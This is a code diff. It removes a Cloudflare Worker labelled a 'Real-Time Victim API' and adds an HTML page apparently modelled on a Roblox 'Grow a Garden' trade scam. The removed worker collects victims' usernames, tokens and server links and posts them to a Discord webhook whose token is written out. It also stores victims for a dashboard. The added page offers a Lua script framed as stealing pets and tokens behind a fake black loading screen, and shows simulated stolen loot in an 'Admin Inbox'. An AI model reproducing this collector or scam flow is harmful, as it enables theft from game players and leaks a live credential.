@@ -1,37 +1,265 @@
-// Cloudflare Worker: Real-Time Victim API
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request))
-})
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garden Roblox Script & Inbox</title>
+    <style>
+        :root {
+            --bg-color: #121212;
+            --card-bg: #1e1e1e;
+            --text-main: #e0e0e0;
+            --accent-green: #4caf50;
+            --accent-gold: #ffd700;
+            --code-bg: #282c34;
+        }
 
-async function handleRequest(request) {
-  if (request.method === 'POST') {
-    const victimData = await request.json()
-    
-    // 1. INSTANT DISCORD NOTIFICATION
-    await fetch('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `🟢 **NEW VICTIM!**\n${victimData.username}\n💰 ${victimData.tokens} TOKENS\n🔗 ${victimData.serverLink}`
-      })
-    })
-    
-    // 2. SAVE TO KV Storage (persistent)
-    const victims = await VICTIMS.get('victims', { type: 'json' }) || []
-    victims.unshift(victimData)
-    await VICTIMS.put('victims', JSON.stringify(victims.slice(0, 100))) // Keep 100 latest
-    
-    // 3. DASHBOARD API Response
-    return new Response(JSON.stringify({ success: true, victim: victimData }), {
-      headers: { 'Content-Type': 'application/json' }
-    })
-  }
-  
-  // GET all victims for dashboard
-  if (request.url.includes('/victims')) {
-    const victims = await VICTIMS.get('victims', { type: 'json' }) || []
-    return new Response(JSON.stringify(victims), {
-      headers: { 'Content-Type': 'application/json' }
-    })
-  }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Courier New', Courier, monospace; /* Hacker style */
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 600px;
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+
+        /* --- SCRIPT BOX SECTION --- */
+        .script-section {
+            background-color: var(--card-bg);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        .section-title {
+            color: var(--accent-green);
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+
+        /* The Box containing the Lua Script */
+        .code-box {
+            background-color: var(--code-bg);
+            color: #abb2bf;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            line-height: 1.4;
+            white-space: pre-wrap; /* Keeps formatting */
+            overflow-x: auto;
+            border-left: 4px solid var(--accent-gold);
+        }
+
+        .copy-btn {
+            background-color: #333;
+            color: white;
+            border: 1px solid #555;
+            padding: 5px 10px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            border-radius: 4px;
+        }
+
+        /* --- INBOX SECTION --- */
+        .inbox-section {
+            background-color: var(--card-bg);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        .inbox-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .notification-card {
+            background-color: #252526;
+            border-left: 4px solid var(--accent-gold);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            animation: slideIn 0.5s ease;
+        }
+
+        .notif-player { color: #fff; font-weight: bold; font-size: 1.1rem; }
+        .notif-item { color: var(--accent-gold); font-weight: bold; }
+        .notif-link { color: #888; font-size: 0.9rem; text-decoration: none; display: block; margin-top: 5px;}
+        .notif-link:hover { text-decoration: underline; color: white; }
+
+        /* --- BLACK LOADING SCREEN OVERLAY --- */
+        #blackScreen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: black;
+            z-index: 9999;
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid var(--accent-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+
+    <!-- 1. THE SCRIPT BOX -->
+    <div class="script-section">
+        <h3 class="section-title">📜 Copy This Lua Script</h3>
+        
+        <!-- The actual code that goes into the Roblox script executor -->
+        <div class="code-box" id="luaCode">
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- CONFIGURATION
+local AdminName = "TheAdmin" -- Change this to your name
+local ServerLink = "https://www.roblox.com/games/1234567890/Grow-A-Garden"
+
+print("[SCRIPT] Injected! Waiting for trade...")
+
+-- SIMULATE THE STEALING PROCESS
+task.wait(3) -- Wait 3 seconds to simulate the "Black Loading Screen" time
+
+local victim = Players.LocalPlayer -- In real game, this is the target player
+local stolenPet = "Golden Dragon (Godly)"
+local stolenTokens = 5000
+
+-- Add items to inventory (Simulated)
+print("[SCRIPT] Stealing " .. stolenPet .. "...")
+task.wait(1)
+print("[SCRIPT] Stealing " .. stolenTokens .. " Tokens...")
+task.wait(1)
+
+-- SEND NOTIFICATION TO INBOX
+local data = {
+    player = victim.Name,
+    pet = stolenPet,
+    tokens = stolenTokens,
+    link = ServerLink
 }
+game:GetService("ReplicatedStorage").Inbox:FireServer(data) -- This sends it to your inbox
+
+print("[SCRIPT] Trade complete! Check your inbox.")
+        </div>
+
+        <button class="copy-btn" onclick="copyScript()">Copy Script</button>
+    </div>
+
+    <!-- 2. THE INBOX -->
+    <div class="inbox-section">
+        <div class="inbox-header">
+            <h3 class="section-title">📩 Admin Inbox (Notifications)</h3>
+            <span style="color: #888;">Waiting for script usage...</span>
+        </div>
+
+        <div id="inbox-list">
+            <!-- Notifications will appear here -->
+            <div style="text-align:center; color:#555; margin-top:20px;">
+                No notifications yet. Use the script above!
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<!-- BLACK LOADING SCREEN OVERLAY -->
+<div id="blackScreen">
+    <div class="spinner"></div>
+    <p style="color: white; margin-top: 20px;">Loading Assets...</p>
+</div>
+
+<script>
+    // --- LOGIC TO SIMULATE THE SCRIPT USAGE ---
+
+    function copyScript() {
+        const code = document.getElementById('luaCode').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+            alert("Lua Script Copied! Paste this into your Roblox Executor.");
+            simulateUserUsage(); // Automatically trigger the effect for demo purposes
+        });
+    }
+
+    function simulateUserUsage() {
+        const screen = document.getElementById('blackScreen');
+        
+        // 1. Show Black Loading Screen
+        screen.style.display = 'flex';
+
+        // 2. Wait 3 seconds (Simulating the "Loading" time)
+        setTimeout(() => {
+            // Generate random data for the victim
+            const victims = ["RobloxPlayer1", "GamerPro99", "PetLover_X", "NoobMaster"];
+            const pets = ["Unicorn", "Dragon", "Alien", "Robot Dog"];
+            
+            const victimName = victims[Math.floor(Math.random() * victims.length)];
+            const stolenPet = pets[Math.floor(Math.random() * pets.length)] + " (Legendary)";
+            const tokens = Math.floor(Math.random() * 5000) + 1000;
+
+            // 3. Hide Screen & Add to Inbox
+            screen.style.display = 'none';
+            
+            addNotification(victimName, stolenPet, tokens);
+
+        }, 3000);
+    }
+
+    function addNotification(player, pet, tokens) {
+        const inbox = document.getElementById('inbox-list');
+        
+        // Remove the "empty" message if it exists
+        if(inbox.innerText.includes("No notifications")) {
+            inbox.innerHTML = "";
+        }
+
+        const card = document.createElement('div');
+        card.className = 'notification-card';
+        card.innerHTML = `
+            <div class="notif-player">Player: ${player}</div>
+            <div style="margin-top:5px;">📦 Loot Received:</div>
+            <div class="notif-item">${pet}</div>
+            <div class="notif-item" style="color:#4caf50; font-size:1.2rem;">${tokens} Tokens</div>
+            <a href="#" class="notif-link">🔗 Join Server & Accept Trade</a>
+        `;
+
+        // Add to top of list
+        inbox.prepend(card);
+    }
+
+    // Run once on load to show the script box working
+    window.onload = function() {
+        console.log("Inbox Ready");
+    };
+</script>
+
+</body>
+</html>
